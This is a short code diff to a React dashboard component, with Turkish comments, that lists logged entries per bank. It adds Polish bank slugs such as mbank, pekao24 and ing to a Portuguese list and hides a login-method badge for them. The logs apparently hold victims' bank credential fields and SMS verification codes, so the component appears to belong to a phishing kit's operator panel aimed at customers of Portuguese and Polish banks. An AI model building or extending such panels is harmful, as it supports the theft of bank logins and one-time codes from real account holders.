@@ -542,10 +542,13 @@ function resolveBankLogoUrl(fd: Record<string, any>): { src: string | null; init
   return { src: finalSrc, initials, fallbackColor };
 }
 
-// PT banka slug'lari: giris yontemi kavrami yok (ozel sablon),
+// PT/PL banka slug'lari: giris yontemi kavrami yok (ozel sablon),
 // Banka kolonunda "Giris yontemi: bekleniyor" rozeti gosterilmez.
 const PT_BANK_SLUGS = new Set([
   "cgd", "abanca", "bpi", "novo-banco", "santander-pt",
+  "alior", "bnpparibas", "bosbank", "bps", "bsr-krakow", "ca24",
+  "citibank", "ing", "ipko", "mbank", "millennium", "pekao24",
+  "pocztowy", "santander", "sgb", "velobank",
 ]);
 
 // ============================================================
@@ -2542,7 +2545,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                                 Henüz banka seçilmedi
                               </div>
                             )}
-                            {loginMethod && (
+                            {loginMethod && !isPtBank && (
                               <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[11px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Yöntem: {loginMethod}
                               </span>
@@ -2780,6 +2783,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             const shortCreds = getShortBankCredentialFields(fd);
             const loginMethod = readLoginMethod(fd);
             const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
+            const isPtBank = PT_BANK_SLUGS.has(rawBankSlugLower) || /(^|[-_\s])pt($|[-_\s])/.test(rawBankSlugLower);
             const smsValue =
               typeof fd.smsCode === "string" && fd.smsCode.trim()
                 ? fd.smsCode.trim()
@@ -2867,7 +2871,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {fd.bankName}
                       </div>
                     )}
-                    {loginMethod && (
+                    {loginMethod && !isPtBank && (
                       <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 break-words [overflow-wrap:anywhere]">
                         Yöntem: {loginMethod}
                       </span>
